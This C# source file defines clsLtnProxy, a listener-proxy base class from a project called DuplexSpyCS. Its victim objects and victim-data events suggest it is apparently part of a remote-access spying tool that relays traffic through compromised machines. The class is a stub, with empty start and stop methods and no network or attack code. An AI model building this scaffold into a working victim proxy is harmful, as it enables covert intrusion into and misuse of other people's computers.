using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    public class clsLtnProxy : IDisposable
    {
        private bool _disposed = false;

        public string m_szName { get; init; }
        public int m_nPort { get; init; }
        public string m_szDescription { get; init; }
        public clsSqlConn.enProxyProtocol m_enProtocol { get; init; }

        public clsVictim m_victim { get; init; }

        public bool m_bIsRunning = false;

        public delegate void dlgUserConnected(clsLtnProxy ltnProxy);
        public event dlgUserConnected OnUserConnected;
        public delegate void dlgProxyOpened(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim);
        public event dlgProxyOpened OnProxyOpened;
        public delegate void dlgProxyClosed(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim);
        public event dlgProxyClosed OnProxyClosed;
        public delegate void dlgVictimOnData(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, byte[] abData);
        public event dlgVictimOnData OnRecvVictimData;

        public clsLtnProxy()
        {

        }

        ~clsLtnProxy()
        {
            Dispose(false);
        }

        public async virtual void fnStart()
        {

        }

        public async virtual void fnStop()
        {

        }

        public void fnOnProxyOpened(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim)
        {
            OnProxyOpened?.Invoke(ltnProxy, nStreamId, victim);
        }

        public void fnOnRecvVictimData(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, byte[] abData)
        {
            OnRecvVictimData?.Invoke(ltnProxy, nStreamId, victim, abData);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (disposing)
                {
                    m_bIsRunning = false;
                }

                _disposed = true;
            }
        }
    }
}
